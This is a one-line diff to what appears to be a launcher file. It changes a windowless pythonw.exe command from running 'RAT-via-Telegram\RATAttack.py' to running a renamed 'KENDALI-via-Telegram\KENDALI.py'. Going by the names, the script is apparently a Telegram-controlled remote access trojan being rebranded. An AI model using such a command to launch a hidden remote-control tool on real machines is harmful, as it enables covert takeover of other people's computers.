@@ -1,1 +1,1 @@
-C:/Python27/pythonw.exe "D:\Google Drive\Programming\Python\RAT-via-Telegram\RATAttack.py"
+C:/Python27/pythonw.exe "C:\Kendali\KENDALI-via-Telegram\KENDALI.py"
